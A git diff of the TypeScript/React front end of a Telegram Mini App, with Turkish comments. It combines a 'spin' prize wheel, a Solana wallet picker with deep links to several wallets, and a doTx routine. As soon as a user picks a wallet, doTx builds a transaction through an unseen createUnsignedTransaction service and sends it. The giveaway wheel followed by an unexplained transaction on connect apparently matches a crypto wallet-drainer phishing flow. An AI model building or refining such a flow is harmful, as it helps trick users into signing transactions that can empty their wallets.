@@ -11,7 +11,7 @@ import { useConnection, useWallet } from '@solana/wallet-adapter-react'
 import type { WalletAdapter, WalletReadyState, WalletName } from '@solana/wallet-adapter-base'
 import { createUnsignedTransaction } from '@/app/services/transaction'
 
-// ——— Yalnızca solana augmentasyonu ———
+// ——— Yalnızca Solana augmentasyonu ———
 declare global {
   interface Window {
     solana?: {
@@ -20,16 +20,15 @@ declare global {
       disconnect?: () => Promise<void>
       signTransaction?: (tx: any) => Promise<any>
     }
-    Telegram?: { WebApp?: any }
   }
 }
 
 // ——— Yerel Telegram WebApp tipi ———
 interface TgWebApp {
-  expand: () => void
+  expand(): void
   requestFullscreen?: () => void
-  setHeaderColor: (typeOrColor: string, colorHex?: string) => void
-  setBackgroundColor: (colorHex: string) => void
+  setHeaderColor(typeOrColor: string, colorHex?: string): void
+  setBackgroundColor(colorHex: string): void
   disableVerticalSwipes?: () => void
   scroll?: (offsetY: number) => void
 }
@@ -37,7 +36,8 @@ interface TgWebApp {
 export default function Page() {
   /* ——— Telegram Mini-App başlat ——— */
   useEffect(() => {
-    const webapp = window.Telegram?.WebApp as TgWebApp | undefined
+    // TS tip bildirimleri çatışmasın diye window.Telegram direkt any olarak alıyoruz
+    const webapp = (window as any).Telegram?.WebApp as TgWebApp | undefined
     if (!webapp) return
     try {
       webapp.expand()
@@ -54,10 +54,22 @@ export default function Page() {
     } catch { /**/ }
   }, [])
 
+  /* ——— Origin & DApp URL ——— */
+  const origin = typeof window !== 'undefined' ? window.location.origin : ''
+  const dappUrl = encodeURIComponent(origin)
+
+  /* ——— Phantom deeplink fonksiyonu ——— */
+  const openPhantomBrowser = () => {
+    const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
+    window.open(universal, '_blank')
+  }
+
   /* ——— Çark (spin) durumu ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
   const [hasSpun, setHasSpun] = useState<boolean>(
-    () => typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
+    () =>
+      typeof window !== 'undefined' &&
+      localStorage.getItem('hasSpun') === 'true'
   )
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
@@ -78,15 +90,8 @@ export default function Page() {
   }
 
   /* ——— Wallet & Drawer kontrolü ——— */
-  const { connection: conn } = useConnection()
-  const {
-    wallets,
-    wallet,
-    select,
-    connect,
-    publicKey,
-    sendTransaction
-  } = useWallet()
+  const { connection: conn, sendTransaction, select, publicKey, wallets } = useWallet()
+  const { connection } = useConnection()
 
   const [drawerOpen, setDrawerOpen] = useState(false)
   const [loading,    setLoading]    = useState(false)
@@ -94,16 +99,6 @@ export default function Page() {
 
   const openDrawer  = () => setDrawerOpen(true)
   const closeDrawer = () => setDrawerOpen(false)
-
-  /* ——— Origin & DApp URL ——— */
-  const origin = typeof window !== 'undefined' ? window.location.origin : ''
-  const dappUrl = encodeURIComponent(origin)
-
-  /* ——— Phantom deeplink fonksiyonu ——— */
-  const openPhantomBrowser = () => {
-    const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
-    window.open(universal, '_blank')
-  }
 
   /* ——— Wallet yapılandırmaları & sıralama ——— */
   interface WalletConfig {
@@ -113,13 +108,42 @@ export default function Page() {
     deepLink: string
   }
   const walletConfigs: WalletConfig[] = [
-    { match: n => n === 'Phantom',           label: 'Phantom',         icon: '/phantom.svg',   deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}` },
-    { match: n => n.toLowerCase().includes('trust'),  label: 'Trust Wallet',     icon: '/trustwallet.svg', deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}` },
-    { match: n => n.toLowerCase().includes('coinbase'), label: 'Coinbase Wallet', icon: '/coinbase.svg',  deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}` },
-    { match: n => n.toLowerCase().includes('bitkeep') || n.toLowerCase().includes('bitget'),
-      label: 'Bitget Wallet', icon: '/bitget.svg', deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}` },
-    { match: n => n === 'Solflare',           label: 'Solflare',        icon: '/solflare.svg', deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
-    { match: n => n === 'Backpack',           label: 'Backpack',        icon: '/backpack.svg', deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
+    {
+      match: name => name === 'Phantom',
+      label: 'Phantom',
+      icon: '/phantom.svg',
+      deepLink: '' // Phantom özel: openPhantomBrowser() kullanacağız
+    },
+    {
+      match: name => /trust/i.test(name),
+      label: 'Trust Wallet',
+      icon: '/trustwallet.svg',
+      deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}`
+    },
+    {
+      match: name => /coinbase/i.test(name),
+      label: 'Coinbase Wallet',
+      icon: '/coinbase.svg',
+      deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}`
+    },
+    {
+      match: name => /bitkeep|bitget/i.test(name),
+      label: 'Bitget Wallet',
+      icon: '/bitget.svg',
+      deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}`
+    },
+    {
+      match: name => name === 'Solflare',
+      label: 'Solflare',
+      icon: '/solflare.svg',
+      deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}`
+    },
+    {
+      match: name => name === 'Backpack',
+      label: 'Backpack',
+      icon: '/backpack.svg',
+      deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}`
+    },
   ]
 
   type DrawerWallet = WalletConfig & {
@@ -127,39 +151,24 @@ export default function Page() {
     readyState: WalletReadyState
   }
 
-  const mappedWallets = walletConfigs.map(cfg => {
-    const w = wallets.find(w => cfg.match(w.adapter.name))
-    return w ? { adapter: w.adapter, readyState: w.readyState, ...cfg } : null
-  })
-  const orderedWallets: DrawerWallet[] = mappedWallets.filter(
-    (x): x is DrawerWallet => x !== null
-  )
+  const orderedWallets: DrawerWallet[] = walletConfigs
+    .map(cfg => {
+      const w = wallets.find(w => cfg.match(w.adapter.name))
+      return w ? { adapter: w.adapter, readyState: w.readyState, ...cfg } : null
+    })
+    .filter((x): x is DrawerWallet => x !== null)
 
   /* ——— Transaction gönderme ——— */
   const doTx = async () => {
     setLoading(true)
     try {
-      // unsigned tx oluştur
-      const tx = await createUnsignedTransaction(publicKey || null)
+      const tx = await createUnsignedTransaction(publicKey!)
       if (!tx) {
         setMsg('No enough Sol!')
         return
       }
-
-      const name = wallet?.adapter.name
-
-      if (name === 'Trust Wallet') {
-        // Trust Wallet için manuel imzala + raw gönder
-        // @ts-expect-error adapter may not implement signTransaction
-        const signed = await wallet.adapter.signTransaction?.(tx)
-        const sig    = await conn.sendRawTransaction(signed!.serialize())
-        await conn.confirmTransaction(sig, 'confirmed')
-      } else {
-        // diğerleri için helper
-        const sig = await sendTransaction(tx, conn)
-        await conn.confirmTransaction(sig, 'confirmed')
-      }
-
+      const sig = await sendTransaction(tx, connection)
+      await connection.confirmTransaction(sig, 'confirmed')
       setMsg('Transaction successful!')
     } catch (e) {
       console.error('Transaction error', e)
@@ -179,20 +188,21 @@ export default function Page() {
   /* ——— Cüzdan seçimi ——— */
   const handleWalletClick = async (w: DrawerWallet) => {
     closeDrawer()
-    if (w.adapter.name === 'Phantom') {
+
+    if (w.label === 'Phantom') {
       if (w.readyState === 'Installed' && window.solana?.isPhantom) {
         await select(w.adapter.name as WalletName)
-        await connect()
         return doTx()
       } else {
         return openPhantomBrowser()
       }
     }
+
     if (w.readyState === 'Installed') {
       await select(w.adapter.name as WalletName)
-      await connect()
       return doTx()
     }
+
     window.open(w.deepLink, '_blank')
   }
 
